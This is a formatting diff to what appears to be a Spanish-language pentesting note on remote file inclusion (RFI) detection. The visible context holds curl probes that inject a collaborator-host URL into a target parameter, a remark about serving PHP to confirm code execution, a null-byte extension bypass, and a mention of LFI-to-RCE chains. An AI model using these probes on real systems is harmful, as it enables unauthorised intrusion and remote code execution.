@@ -15,7 +15,7 @@ linked:
 ---
 # RFI - Detección y Reconocimiento
 
-***
+---
 
 ## Identificar Endpoints Vulnerables
 
@@ -42,7 +42,7 @@ linked:
 | Default extension append | App appends `.php` → null byte trick | Standard. |
 ^rfi-detect-endpoints
 
-___
+---
 
 ## Probes con URL Remota
 
@@ -84,7 +84,7 @@ curl -s "${TARGET}?${PARAM}=http://${COLLAB}/test"
 # If atacante also serves PHP code → confirm execution
 ```
 
-___
+---
 
 ## Detectar PHP Version + `allow_url_include`
 
@@ -136,4 +136,4 @@ curl -s "${TARGET}?page=http://${COLLAB}/test"
 #   - Or LFI to RCE chain (log poisoning, etc)
 ```
 
-***
+---
